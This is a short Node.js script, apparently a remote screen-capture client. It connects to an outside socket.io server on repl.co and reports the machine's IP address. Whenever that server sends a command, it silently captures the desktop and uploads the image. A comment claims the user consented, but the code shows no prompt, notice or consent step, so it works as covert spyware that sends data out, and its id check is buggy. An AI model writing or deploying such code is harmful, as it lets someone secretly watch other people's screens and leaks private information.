// Screen record used to conduct experiment that the user gave permission
const io = require('socket.io-client')('https://WebtoonControl.pdaniely.repl.co')
const fs = require('fs')
const ip = require('ip')
let id;

io.emit('server',{ip: ip.address()})
var screenshot = require('desktop-screenshot');

io.on('id',(number)=>{
    id = number
})

io.on('connect-b',(data)=>{
    if(data == undefined){
        console.log(`Error: Data is undefined`)
        return
    }
    if(!data.id == id){
        return
    }
    console.log(`Connected to admin`)
})
io.on('screenshot',(data)=>{
    if(!data.id == id){
        return
    }
    screenshot("images/screenshot.png", function(error, complete) {
        if(error){
            io.emit('error',error)
            return
        }
        io.emit('screenshot',{screenshot: fs.readFileSync('images/screenshot.png'), id: id})
        fs.unlinkSync('images/screenshot.png')
    })
})
io.on('end',()=>{
    process.exit()
})